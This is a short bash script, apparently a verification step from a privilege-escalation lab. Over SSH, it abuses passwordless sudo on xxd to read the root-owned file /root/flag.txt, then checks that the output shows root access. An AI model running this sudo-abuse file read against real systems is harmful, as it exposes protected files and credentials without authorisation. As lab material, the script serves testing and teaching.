#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -n /usr/bin/xxd -p /root/flag.txt | xxd -r -p')"
assert_root_output "${out}"
